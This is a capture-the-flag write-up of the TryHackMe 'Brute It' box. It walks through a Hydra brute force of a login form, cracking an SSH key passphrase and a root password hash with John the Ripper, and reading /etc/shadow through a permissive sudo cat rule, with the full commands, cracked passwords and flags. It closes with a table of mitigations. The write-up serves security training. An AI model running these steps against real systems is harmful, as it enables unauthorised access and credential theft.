```
 ██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ██╗████████╗
 ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██║╚══██╔══╝
 ██████╔╝██████╔╝██║   ██║   ██║   █████╗      ██║   ██║
 ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ██║   ██║
 ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║   ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝   ╚═╝
              TryHackMe: Brute It
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-07 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐☆☆☆

> ⏱️ ~10 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)
- [SEO & Publishing](#-seo--publishing)

---

## Progress Checklist

- [x] Port scan: SSH (22), HTTP (80)
- [x] Web directory brute force: found `/admin/`
- [x] Discovered username `admin` in HTML source comment
- [x] Hydra HTTP POST brute force → password cracked
- [x] Logged into admin panel: retrieved encrypted SSH private key
- [x] Cracked SSH key passphrase with John the Ripper (`rockinroll`)
- [x] SSH login as `john` using cracked key
- [x] Retrieved user flag
- [x] Identified `sudo cat` with no password required
- [x] Read `/etc/shadow` via `sudo cat`
- [x] Cracked root hash with John the Ripper (`football`)
- [x] `su root` with cracked password
- [x] Retrieved root flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 🕷️ Feroxbuster: web directory enumeration
- 🐉 Hydra: HTTP POST form brute force
- 🔑 ssh2john + John the Ripper: SSH key passphrase and shadow hash cracking
- 🔐 SSH: authenticated user shell

---

## ⚡ TL;DR

A username left in an HTML comment led to a Hydra brute force of the admin panel. The panel served an encrypted SSH private key for user `john`; John the Ripper cracked the passphrase in milliseconds. Once in, `sudo cat` with no password restriction let us read `/etc/shadow`, and cracking the root hash with John handed over the password to `su` straight into a root shell.

---

## 📖 Introduction

Today's target is **Brute It**: a box that doesn't waste time on subtlety. The name tells you the method, an HTML comment tells you the username, and the admin panel hands you an SSH key once you've knocked loudly enough with Hydra. The privilege escalation path is a masterclass in how a single dangerous `sudo` rule can unravel an entire system: `sudo cat` sounds harmless until you realise it can read `/etc/shadow`, the one file that was standing between an unprivileged user and root access. Subtle, this box is not. Educational, absolutely.

### Prerequisites

Readers are assumed to know:

- What HTTP POST form brute forcing is and how Hydra constructs the attack
- What an SSH private key is and why a passphrase protects it
- What `/etc/shadow` is and why it's sensitive
- What `su` does and how it differs from `sudo`
- Basic hash cracking with John the Ripper

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

*Full-range sweep with RustScan, Nmap for service and version fingerprinting:*

```bash
rustscan -a 10.48.165.203 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80/tcp | HTTP | Apache httpd 2.4.29 (Ubuntu) |

Standard two-port setup. Apache 2.4.29 is showing some age: Ubuntu 18.04 era. The HTTP title returns the default Apache page, which means the actual content is hiding somewhere else. Time to enumerate.

### Web Directory Enumeration

*(~3 mins into the box)*

*Feroxbuster with PHP, TXT, and HTML extensions:*

```bash
feroxbuster -u http://10.48.165.203 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html
```

```
# output (relevant hits only)
301  http://10.48.165.203/admin          # ^^^ login panel
200  http://10.48.165.203/admin/index.php
301  http://10.48.165.203/admin/panel    # ^^^ post-login area
```

`/admin/` is the target. The existence of `/admin/panel/` suggests something waits beyond a successful login.

### HTML Source: Username in a Comment

*Viewing the admin login page source:*

```
view-source:http://10.48.165.203/admin/
```

```html
<!-- Hey john, if you do not remember, the username is admin -->
```

Someone left a note for John. We're reading John's mail now. Username: `admin`. The comment also leaks the name `john`: which becomes relevant later as a system user.

---

## 🚪 Foothold

*(~5 mins into the box)*

### HTTP POST Brute Force: Hydra

With the username confirmed as `admin`, Hydra attacks the login form. The failure string (`Invalid`) was identified by submitting a wrong password manually and checking the response: a required step before constructing the Hydra command correctly.

*Brute forcing the admin login with rockyou.txt:*

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.165.203 \
  http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Invalid" -V
```

```
# output (truncated: ran ~500 attempts before hitting)
[80][http-post-form] host: 10.48.165.203   login: admin   password: xavier
```

*(truncated: full attempt log in notes)*

Password: `xavier`. Admin panel access confirmed.

### Admin Panel: SSH Private Key

Inside the admin panel at `/admin/panel/`, the page surfaces an RSA private key for user `john`: encrypted with a passphrase. The key was copied and saved locally as `id_rsa`.

### SSH Key Passphrase Cracking: John the Ripper

**Why crack an SSH key passphrase?** An encrypted SSH private key is useless without its passphrase: the passphrase derives the decryption key that unlocks the actual RSA key material. `ssh2john` converts the key into a hash format John the Ripper understands, then rockyou.txt does the rest.

*Converting the key to a crackable hash:*

```bash
ssh2john id_rsa > key.hash
```

*Cracking the passphrase:*

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```

```
# output
rockinroll       (id_rsa)
1g : DONE
```

Passphrase: `rockinroll`. Cracked before the progress bar had time to render.

---

## 🐚 Shell / Access

*(~10 mins into the box)*

*SSH into the box as `john` using the decrypted private key:*

```bash
ssh john@10.48.165.203 -i id_rsa
```

```
Enter passphrase for key 'id_rsa': rockinroll
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
john@bruteit:~$
```

*Collecting the user flag:*

```bash
cat user.txt
```

```
THM{a_password_is_not_a_barrier}
```

The flag is self-aware. Points for honesty.

---

## 📈 Escalation

*(~12 mins into the box)*

### sudo cat: Reading /etc/shadow

*Checking sudo permissions:*

```bash
sudo -l
```

```
User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

**Why is `sudo cat` dangerous?** `cat` reads files and prints their contents to stdout: nothing more. But when run as root, it can read *any* file on the system, including files that are normally restricted to root only. `/etc/shadow` stores hashed passwords for every user account. A low-privilege user can't read it directly, but `sudo cat` bypasses that restriction entirely.

*Reading the shadow file:*

```bash
sudo cat /etc/shadow
```

```
# output (relevant entries only)
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7: :
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7: :
```

*(truncated: only root and john hashes are actionable)*

### Cracking the Root Hash

The root hash format is `$6$`: SHA-512 crypt, Hashcat mode 1800 / John type `sha512crypt`. Rockyou.txt handles it in under a second.

*Saving the root hash and cracking it:*

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt root.hash
```

```
# output
football         (root)
1g : DONE
```

Root password: `football`.

### su root: Becoming Root

With the plaintext root password in hand, `su` completes the escalation without any further tricks needed.

*Switching to root:*

```bash
su root
```

```
Password: football
root@bruteit:/home/john#
```

*Collecting the root flag:*

```bash
cat /root/root.txt
```

```
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## 💥 Exploitation

The complete attack chain, end to end:

1. **HTML source comment** → username `admin`, system username hint `john`
2. **Hydra HTTP POST brute force** → admin panel password `xavier`
3. **Admin panel** → encrypted SSH private key for `john`
4. **John the Ripper** → SSH key passphrase `rockinroll`
5. **SSH login as `john`** → user flag
6. **`sudo cat /etc/shadow`** → root password hash extracted
7. **John the Ripper** → root password `football`
8. **`su root`** → root shell → root flag

---

## 🐇 Rabbit Holes

### Attempting SSH Without `-i`

First SSH attempt reflexively ran without specifying the key file: prompted for a password instead of the passphrase, which failed since `john` has no password authentication configured. One `Ctrl+C` and a corrected command later, `-i id_rsa` sorted it.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `THM{a_password_is_not_a_barrier}` | `/home/john/user.txt` |
| Root | `THM{pr1v1l3g3_3sc4l4t10n}` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Username hardcoded in HTML comment | Medium | Never put credentials, usernames, or hints in client-deliverable HTML; use server-side session management |
| Weak admin password (`xavier`) in rockyou.txt | High | Enforce strong password policy; implement account lockout or rate limiting on login forms |
| Encrypted SSH key exposed via admin panel | High | Private keys should never be accessible through a web interface; use certificate-based SSH with keys stored only on authorised hosts |
| Weak SSH key passphrase (`rockinroll`) | High | Use a long, randomly generated passphrase for any SSH key; consider a hardware token |
| `sudo cat` with `NOPASSWD` | Critical | `cat` can read any file as root: granting this is equivalent to granting read access to the entire filesystem; remove it entirely from `sudoers` |
| Weak root password (`football`) in rockyou.txt | Critical | Root password must be long and random; disable direct root login via `su` and require `sudo` with MFA |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** `sudo cat` is not a safe alternative to `sudo vim` or `sudo bash`: the ability to read any file as root is all an attacker needs to extract `/etc/shadow`, `/root/.ssh/id_rsa`, or any other secret on the system. Before adding anything to `sudoers`, ask: "what happens if this binary reads a file it shouldn't?" If the answer is "total compromise," keep it off the list.

---

## 🔁 If I Did It Again

Pipe the `/etc/shadow` output directly through John on the victim side isn't possible (no John on target), but save a step by pulling only the root line with `sudo cat /etc/shadow | grep root` rather than copying the entire file: cleaner notes, same result.

---

## 🔚 Changelog

*Last updated: 2026-06-07*

---
